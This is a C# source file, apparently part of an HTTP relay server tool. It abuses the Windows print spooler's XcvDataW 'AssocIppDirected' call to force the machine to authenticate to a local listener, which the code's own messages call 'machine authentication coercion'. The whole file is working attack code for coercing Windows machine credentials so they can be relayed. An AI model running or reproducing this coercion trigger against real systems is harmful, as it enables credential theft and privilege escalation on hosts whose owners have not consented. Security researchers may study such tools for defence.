using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Httprelayserver.AuthTrigger
{
    public static class IppTrigger
    {
        private const int ASSOC_TIMEOUT_MS = 8000;
        private const string XCV_MONITOR_NAME = ",XcvMonitor WSD Port";
        private const int SERVER_ACCESS_ADMINISTER = 0x0001;
        private const int READ_CONTROL = 0x00020000;

        [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool OpenPrinterW(
            string pPrinterName,
            out IntPtr phPrinter,
            ref PRINTER_DEFAULTS pDefault);

        [DllImport("winspool.drv", SetLastError = true)]
        private static extern bool ClosePrinter(IntPtr hPrinter);

        [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool XcvDataW(
            IntPtr hXcv,
            string pszDataName,
            IntPtr pInputData,
            uint cbInputData,
            IntPtr pOutputData,
            uint cbOutputData,
            out uint pcbOutputNeeded,
            out uint pdwStatus);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct PRINTER_DEFAULTS
        {
            public string pDatatype;
            public IntPtr pDevMode;
            public int DesiredAccess;
        }

        public static bool Trigger(int port)
        {
            string uri = $"ipp://localhost:{port}/ipp/print";

            Console.WriteLine("[+] Triggering IPP association for machine authentication coercion");
            Console.WriteLine($"[i] IPP URI: {uri}");

            IntPtr hServer = IntPtr.Zero;
            IntPtr hXcv = IntPtr.Zero;

            var pdServer = new PRINTER_DEFAULTS
            {
                pDatatype = null,
                pDevMode = IntPtr.Zero,
                DesiredAccess = READ_CONTROL
            };

            var pdXcv = new PRINTER_DEFAULTS
            {
                pDatatype = null,
                pDevMode = IntPtr.Zero,
                DesiredAccess = SERVER_ACCESS_ADMINISTER
            };

            if (!OpenPrinterW(null, out hServer, ref pdServer))
            {
                Console.WriteLine($"[-] OpenPrinterW(server) failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            if (!OpenPrinterW(XCV_MONITOR_NAME, out hXcv, ref pdXcv))
            {
                int err = Marshal.GetLastWin32Error();
                string extra = err == 5 ? " (run elevated)" : "";
                Console.WriteLine($"[-] OpenPrinterW({XCV_MONITOR_NAME}) failed: {err}{extra}");
                ClosePrinter(hServer);
                return false;
            }

            bool result;
            try
            {
                result = CallAssocIppDirected(hXcv, uri);
            }
            finally
            {
                ClosePrinter(hXcv);
                ClosePrinter(hServer);
            }

            return result;
        }

        private static bool CallAssocIppDirected(IntPtr hXcv, string uri)
        {
            IntPtr pUri = Marshal.StringToHGlobalUni(uri);
            uint cbIn = (uint)((uri.Length + 1) * 2);

            bool ok = false;
            uint needed = 0;
            uint status = 0;
            int lastError = 0;
            bool completed = false;

            var thread = new Thread(() =>
            {
                ok = XcvDataW(hXcv, "AssocIppDirected",
                    pUri, cbIn,
                    IntPtr.Zero, 0,
                    out needed, out status);
                lastError = Marshal.GetLastWin32Error();
                completed = true;
            });

            thread.IsBackground = true;
            thread.Start();

            if (!thread.Join(ASSOC_TIMEOUT_MS))
            {
                Console.WriteLine($"[+] {ASSOC_TIMEOUT_MS / 1000} seconds hit - spooler still associating (auth already forced)");
                Marshal.FreeHGlobal(pUri);
                return true;
            }

            Marshal.FreeHGlobal(pUri);

            if (ok && status == 0)
            {
                Console.WriteLine("[+] Host responded");
                return true;
            }
            else if (ok)
            {
                Console.WriteLine($"[+] Target contacted - machine auth should be inbound (status {status})");
                return true;
            }
            else
            {
                Console.WriteLine($"[-] IPP association failed (error {lastError})");
                return false;
            }
        }

        public static async Task<bool> TriggerAsync(int httpPort, int delayMs = 2000)
        {
            return await Task.Run(() =>
            {
                if (delayMs > 0)
                {
                    Console.WriteLine($"[*] Waiting {delayMs}ms for HTTP server to start...");
                    Thread.Sleep(delayMs);
                }
                return Trigger(httpPort);
            });
        }
    }
}
